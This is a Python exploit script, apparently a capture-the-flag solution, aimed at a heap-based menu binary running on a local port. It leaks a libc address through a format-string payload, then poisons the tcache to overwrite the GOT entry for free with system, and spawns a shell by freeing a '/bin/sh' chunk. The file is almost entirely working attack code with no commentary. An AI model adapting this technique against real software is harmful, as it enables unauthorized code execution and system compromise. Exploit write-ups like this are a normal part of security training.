from ptrlib import *
import re

def add(size, name, price):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("length: ")
    sock.sendline(str(size))
    sock.recvuntil("name: ")
    sock.send(name)
    sock.recvuntil("price: ")
    sock.sendline(str(price))

def remove(index):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("index: ")
    sock.sendline(str(index))

def view():
    sock.recvuntil("> ") 
    sock.sendline("3")
    return sock.recvuntil("(4) Check out")

elf = ELF("./challenge")
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
sock = Socket("127.0.0.1", 4002)
#sock = Socket("192.168.1.19", 4010)
_ = input()

# libc leak
payload = p64(0x41424344)
payload += p64(0)
payload += p64(1337)
payload += b"%15$p\x00"
add(0xf8, "A", 123)
add(0x38, "B", 123)
remove(1)
remove(0)
add(0x38, payload, 123)
ret = view()
addr_libc_start_main_ret = int(re.findall(b"0x[0-9a-f]+", ret)[0], 16)
libc_base = addr_libc_start_main_ret - 0x021b97
addr_system = libc_base + libc.symbol("system")
dump("libc base = " + hex(libc_base))

# tcache poisoning
add(0xf8, "/bin/sh\x00", 123) # 3
add(0xf8, "b", 123) # 4
add(0x38, "c", 123) # 5
add(0xf8, "d", 123) # 6
add(0xf8, "e", 123) # 7
add(0x38, "f", 123) # 8
add(0xf8, "g", 123) # 9
add(0xf8, "g", 123) # 10
add(0xf8, "g", 123) # 11
remove(6)
remove(6)
remove(8)
remove(5)

add(0xf8, p64(elf.got("free")), 123)
add(0xf8, "?", 123)
add(0xf8, p64(addr_system), 123)

remove(3)
sock.interactive()
